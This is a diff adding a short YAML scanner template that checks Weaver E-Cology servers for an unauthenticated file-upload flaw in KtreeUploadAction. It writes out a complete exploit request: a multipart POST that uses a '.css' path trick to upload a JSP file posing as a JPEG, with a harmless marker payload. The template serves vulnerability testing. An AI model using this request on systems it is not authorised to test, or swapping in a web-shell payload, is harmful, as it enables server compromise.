@@ -1,0 +1,16 @@
+name: 泛微E-Cology-KtreeUploadAction文件上传
+description: >
+  拼接返回包文件路径
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: POST
+    path: /weaver/com.weaver.formmodel.apps.ktree.servlet.KtreeUploadAction/.css?action=image
+    headers:
+      Content-Type: multipart/form-data; boundary=ce2c603de19573a853c8facc8cf14425
+    body: "--ce2c603de19573a853c8facc8cf14425\r\nContent-Disposition: form-data; name=\"files\"; filename=\"Rscan.jsp\"\r\nContent-Type: image/jpeg\r\n\r\n<%out.println(\"Rscan_test\");%>\r\n--ce2c603de19573a853c8facc8cf14425--"
+    expression:
+      status: 200
+      body_all:
+        - "original"
+        - "SUCCESS"  
